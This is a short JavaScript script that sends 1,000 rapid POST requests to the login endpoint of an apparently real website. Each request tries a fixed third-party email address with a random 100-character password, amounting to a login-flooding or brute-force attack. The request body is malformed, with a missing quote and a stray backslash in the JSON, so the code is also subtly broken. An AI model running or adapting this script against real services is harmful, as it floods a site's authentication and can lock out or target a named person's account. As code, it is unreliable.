function randomChars(length = 10) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}
async function main() {
  for (let i = 0; i < 1000; i++) {
    setTimeout(async () => {
      const login = await (await fetch("http://araxy.co.uk/login", {
        "body": `{\"email\":\\ytluki87@gmail.com\",\"password\":\"${randomChars(100)}\"}`,
        "method": "POST"
      })).json()
        
      console.log(login)
    }, 10 * i);
  }
}

main();